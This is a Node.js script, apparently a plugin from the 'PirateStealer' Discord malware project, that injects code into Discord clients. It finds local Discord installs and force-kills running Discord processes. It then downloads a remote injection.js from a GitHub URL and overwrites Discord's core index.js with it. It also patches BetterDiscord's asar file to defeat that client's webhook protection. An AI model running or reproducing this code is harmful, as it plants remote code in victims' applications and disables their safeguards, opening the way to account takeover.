// Code is shit
var glob = require("glob");
const fs = require('fs');
const https = require('https');
const {
    exec
} = require('child_process');
const axios = require('axios');
const buf_replace = require('buffer-replace');
var config = {
    "Number Of Rickroll":10
}
var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];
fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});
discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })
});
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/plugins/Rickroll/injection.js', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file,data.replace('%NOR%', config["Number Of Rickroll"])), {
                    encoding: 'utf8',
                    flag: 'w'
                }});
            })
    }).on("error", (err) => {
        console.log(err);
    });
};
function listDiscords() {
    exec('tasklist', function(err, stdout, stderr) {
        if (stdout.includes("Discord.exe")) {
            runningDiscords.push("discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {
            runningDiscords.push("discordcanary")
        }
        if (stdout.includes("DiscordDevelopment.exe")) {
            runningDiscords.push("discorddevelopment")
        }
        if (stdout.includes("DiscordPTB.exe")) {
            runningDiscords.push("discordptb")
        };
        killDiscord();
    })
};
function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
                return;
            }
        });
    });
    Infect()
    pwnBetterDiscord()
};

function pwnBetterDiscord() {
    // thx stanley
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
    } else {
        return;
    }
}
